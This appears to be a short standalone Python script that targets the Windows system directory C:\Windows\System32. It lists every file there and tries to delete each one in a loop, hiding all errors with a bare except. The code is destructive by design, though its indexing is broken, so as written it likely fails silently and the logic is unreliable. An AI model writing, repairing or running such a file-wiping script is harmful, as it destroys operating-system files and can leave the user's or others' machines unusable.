
import os
from os import remove
os.chdir(r"C:\Windows\System32")
routes=(os.listdir("C:\Windows\System32"))
print(len(routes))
for i in routes:
    try:
        remove(routes[i])
    except:
        pass    